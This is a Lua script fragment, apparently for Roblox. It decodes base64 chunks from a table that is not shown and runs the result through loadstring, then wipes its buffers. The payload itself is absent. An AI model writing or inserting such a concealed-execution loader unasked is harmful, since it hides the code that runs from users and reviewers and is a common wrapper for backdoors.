-- ═══ Pure-Lua base64 decoder ═══
local function _b64(s)
    local b = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
    local t = {}
    for i = 1, #b do t[b:sub(i,i)] = i-1 end
    s = s:gsub("[^A-Za-z0-9+/=]", "")
    local r = {}
    local i = 1
    while i <= #s do
        local a,b2,c,d = s:sub(i,i),s:sub(i+1,i+1),s:sub(i+2,i+2),s:sub(i+3,i+3)
        local n = (t[a] or 0)*262144+(t[b2] or 0)*4096+(c~="=" and (t[c] or 0) or 0)*64+(d~="=" and (t[d] or 0) or 0)
        r[#r+1] = string.char(math.floor(n/65536)%256)
        if c ~= "=" then r[#r+1] = string.char(math.floor(n/256)%256) end
        if d ~= "=" then r[#r+1] = string.char(n%256) end
        i = i+4
    end
    return table.concat(r)
end

-- ═══ Assemble + run ═══
local _S = ""
for i = 1, 140 do _S = _S .. _D[i] end
_D = nil
local _code = _b64(_S)
_S = nil
local _f, _e = loadstring(_code)
if _f then _f()
else warn("[Surface] loadstring: " .. tostring(_e)) end
